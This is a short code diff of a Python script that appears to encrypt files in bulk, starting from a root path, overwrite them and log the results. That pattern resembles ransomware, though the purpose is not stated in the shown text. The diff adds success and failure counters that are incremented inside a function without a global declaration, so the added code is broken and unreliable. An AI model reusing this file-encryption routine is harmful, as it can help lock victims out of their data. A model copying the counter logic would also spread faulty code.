@@ -18,7 +18,7 @@ with open(current_path + 'logs.txt','w') as log_file :
 logging.basicConfig(filename = 'logs.txt',level = logging.ERROR)
           
         
-        
+success,failed = 0,0      
 # Encrypting files
 def file_encrypter(path) :
     try :
@@ -29,10 +29,10 @@ def file_encrypter(path) :
             file.write(encrypted_file)
     except Exception as error_type :
               logging.getLogger().error(f'This path ({path}) was unsuccessfully encrypted due to {error_type}')
-        
+              failed += 1
     else :
             logging.log(level = 10,message = f'This {path} was successfully encrypted')
-            
+            success += 1
 
 # getting files
 def Get_root_files(path) :
